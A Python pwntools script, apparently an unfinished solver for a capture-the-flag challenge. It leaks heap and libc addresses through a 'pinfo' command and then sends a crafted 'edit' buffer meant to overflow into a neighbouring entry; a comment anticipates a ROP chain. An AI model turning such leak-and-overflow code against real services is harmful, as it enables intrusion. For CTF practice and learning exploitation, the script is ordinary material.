import pwn

import sys
import os.path

# can roughly have 7 ROP gadgets initially

def get_conn():
    if len(sys.argv) > 1:
        dest = sys.argv[1]
    else:
        # autodetect
        raise ValueError('not implemented')
    if os.path.exists(dest):
        return pwn.process([dest])
    else:
        host, portstr = dest.split(':', 1)
        port = int(portstr)
        return pwn.connect(host, port)


def solve_chall(conn: pwn.tubes.tube.tube):
    def to_prompt():
        return conn.recvuntil([b'> '])
    to_prompt()
    conn.sendline(b'pinfo')
    pinfo_data = to_prompt()
    pinfo = parse_pinfo(pinfo_data)
    print(repr(pinfo))
    conn.sendline(b'add')
    conn.sendline(b'foo')
    to_prompt()
    conn.sendline(b'add')
    conn.sendline(b'bar')
    to_prompt()
    conn.sendline(b'edit 01')
    buf = b'ABCDabcd'*31
    pad_len = 255-len(buf)
    buf += b'X'*pad_len
    buf += b'\r'
    buf += b'@'
    conn.send(buf)
    to_prompt()
    conn.sendline(b'list all')
    print(conn.recvall(timeout=2.0))


def parse_pinfo(pinfo_data: bytes):
    # buggy if the address contains '\n'
    lines = pinfo_data.split(b'\n')
    res = {}
    for l in lines:
        if l.startswith(b'head: '):
            _, astr = l.split(b' ', 1)
            res["head"] = int(astr, 16)
        elif l.startswith(b'pinfo: '):
            _, astr = l.split(b' ', 1)
            res["pinfo"] = int(astr, 16)
        elif l.startswith(b'libc '):
            _, suffix = l.split(b' version ', 1)
            vstr, suffix = suffix.split(b', release ', 1)
            res["libcv"] = vstr.decode('utf-8')
            addr_partial = suffix[:-3]
            pad = 8 - len(addr_partial)
            addr_partial += b'\x00' * pad
            res["libc_rel_addr"] = pwn.u64(addr_partial)
    return res


def main():
    conn = get_conn()
    solve_chall(conn)

if __name__ == '__main__':
    main()